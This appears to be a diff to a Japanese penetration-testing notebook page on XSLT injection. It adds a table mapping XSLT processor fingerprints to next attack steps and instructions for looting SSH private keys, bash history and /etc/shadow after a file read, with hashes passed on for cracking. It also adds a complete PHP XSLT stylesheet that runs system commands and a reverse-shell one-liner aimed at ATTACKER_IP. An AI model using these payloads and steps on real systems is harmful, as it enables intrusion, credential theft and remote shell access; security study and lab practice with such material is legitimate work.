@@ -57,6 +57,17 @@
 
 `system-property()` 関数は多くのプロセッサで制限されないため、最初のプローブとして使う。
 
+**出力値の読み方と次の手：**
+
+| 出力値 | 意味 | 次にやること |
+|--------|------|------------|
+| `Vendor URL: http://xmlsoft.org/XSLT/` | libxslt（C）。PHP連携の場合もある | ② → ④ → ③ の順で試す |
+| `Vendor: SAXON` またはバージョン番号（HE/PE/EE付き）| Saxon（Java）。バージョン番号でCVEを確認 | searchsploit / NVD でバージョン+CVEを確認。③ `document()` / `unparsed-text()` を試す |
+| `Vendor: Apache Software Foundation` | Xalan（Java） | ⑤ Java拡張要素（`rt:exec`）を試す |
+| `Vendor: Microsoft` | .NET XslCompiledTransform | `msxsl:script` 拡張（C#コード埋め込み）を試す |
+| `Version: 1.0` | XSLT 1.0 のみ対応 | `unparsed-text()` 等の XSLT 2.0 機能は使えない |
+| `Version: 2.0` / `3.0` | XSLT 2.0/3.0 対応（Saxon 系） | `unparsed-text('file:///etc/passwd')` を試す |
+
 **② XXE-via-XSLT（libxslt を含む多くのプロセッサで試す）**
 
 XSLTファイル自体のDOCTYPEでエンティティを宣言することでファイルを読み込む：
@@ -78,6 +89,19 @@ XSLTファイル自体のDOCTYPEでエンティティを宣言することでフ
 ```
 
 > 原理 → `../../../06_Concepts/XSLT_XML_Processing.md`
+
+**ファイルが読めたら次にすること（②③④共通）：**
+
+`/etc/passwd` の内容が取得できたら以下の順で展開する。
+
+1. **有効なユーザーを特定する**：末尾フィールドがシェル（`/bin/bash` 等）で、ホームディレクトリがある行を探す。`/usr/sbin/nologin` / `/bin/false` のユーザーは除外。
+2. **有効ユーザーの資産を読む**：
+   - `file:///home/USERNAME/.ssh/id_rsa` — SSH 秘密鍵（あれば直接ログインへ）
+   - `file:///home/USERNAME/.bash_history` — 過去コマンドに認証情報が残ることがある
+3. **Webアプリ設定ファイルを読む**：アプリのドキュメントルート・設定ディレクトリはアプリ名で検索して特定する（`../../../05_Tools_Reference/Searchsploit.md` の「製品構造調査」参照）
+4. **`/etc/shadow` を読む**：読めた場合はユーザーのハッシュを取得してクラック → `../../../05_Tools_Reference/Hashcat.md`
+
+→ 取得した認証情報の確認手順 → `../../../02_Initial_Access/Credential_Discovery.md`（パスワード使い回し確認の表）
 
 **③ `document()` 関数によるファイル読み込み（Saxon等で有効な場合）**
 
@@ -114,12 +138,22 @@ XSLTファイル自体のDOCTYPEでエンティティを宣言することでフ
 
 `XPath evaluation returned no result` が出る場合、`registerPHPFunctions()` が無効。
 
-RCEを狙う場合：
+RCEを狙う場合は、`file_get_contents` の行を `system` / `passthru` に差し替えたXSLTファイルをアップロードする（`cmd=id` のようなURLパラメータは不要。XSLTの中に直接コマンドを書く）：
 
 ```xml
-<xsl:value-of select="php:function('system', 'id')"/>
-<xsl:value-of select="php:function('passthru', 'id')"/>
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:php="http://php.net/xsl">
+  <xsl:template match="/">
+    <pre><xsl:value-of select="php:function('system', 'id')"/></pre>
+  </xsl:template>
+</xsl:stylesheet>
 ```
+
+コマンドを変えたい場合は `'id'` の部分を `'whoami'` や `'cat /etc/passwd'` に書き換えて都度アップロードする。リバースシェルを引き込む場合は `'id'` の位置にシェルのペイロードを入れる（`bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` 等）。
+
+> シェル取得後の安定化 → `../../../03_Post_Access_Linux/Shell_Stabilization.md`
 
 **⑤ Javaプロセッサ（Xalan）での拡張要素によるRCE**
 
